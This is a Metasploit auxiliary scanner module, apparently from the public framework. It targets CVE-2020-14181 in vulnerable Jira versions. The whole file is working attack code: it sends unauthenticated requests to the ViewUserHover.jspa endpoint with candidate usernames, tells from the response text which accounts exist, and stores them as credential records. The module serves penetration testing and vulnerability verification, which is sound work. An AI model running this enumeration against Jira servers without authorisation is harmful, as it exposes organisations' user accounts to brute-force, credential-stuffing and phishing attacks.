##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Jira Users Enumeration',
        'Description' => %q{
          This module exploits an information disclosure vulnerability that allows an
          unauthenticated user to enumerate users in the /ViewUserHover.jspa endpoint.
          This only affects Jira versions < 7.13.16, 8.0.0 ≤ version < 8.5.7, 8.6.0 ≤ version < 8.12.0
          Discovered by Mikhail Klyuchnikov @__mn1__
          This module was only tested on 8.4.1
        },
        'Author' =>
        [
          'Brian Halbach', # msf module author
          'Mikhail Klyuchnikov' # initial discovery and PoC
        ],
        'License' => MSF_LICENSE,
        'References' =>
          [
            ['URL', 'https://jira.atlassian.com/browse/JRASERVER-71560'],
            ['CVE', '2020-14181'],
          ],
        'DisclosureDate' => '2020-08-16'
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'Jira Path', '/']),
      ]
    )
    deregister_options('PASS_FILE', 'USERPASS_FILE', 'USER_AS_PASS', 'STOP_ON_SUCCESS', 'BLANK_PASSWORDS', 'DB_ALL_CREDS', 'DB_ALL_PASS', 'PASSWORD')
  end

  def base_uri
    @base_uri ||= normalize_uri("#{target_uri.path}/secure/ViewUserHover.jspa")
  end

  def do_user_enum(user)
    print_status("Begin enumerating user at #{vhost}#{base_uri}")
    print_status("checking user #{user}")
    res = send_request_cgi!(
      'uri' => "#{base_uri}",
      'vars_get' => { 'username' => user },
      'method' => 'GET',
      'headers' => { 'Connection' => 'Close' }
    )
    if res.body.include?('User does not exist')
      print_bad("'User #{user} does not exist'")
    elsif res.body.include?('<a id="avatar-full-name-link"') # this works for 8.4.1 not sure about other verions
      connection_details = {
        module_fullname: fullname,
        username: user,
        workspace_id: myworkspace_id,
        status: Metasploit::Model::Login::Status::UNTRIED
      }.merge(service_details)
      create_credential_and_login(connection_details)
      print_good("'User exists: #{user}'")
      @users_found[user] = :reported
    else
      print_error('No Response From Server')
      return :abort
    end

  end

  def run_host(_ip)

    @users_found = {}

    each_user_pass do |user, _pass|
      do_user_enum(user)
    end
    if @users_found.empty?
      print_status("#{full_uri} - No users found.")
    else
      print_good("#{@users_found.length} Users found: #{@users_found.keys.sort.join(', ')}")

    end

  end
end
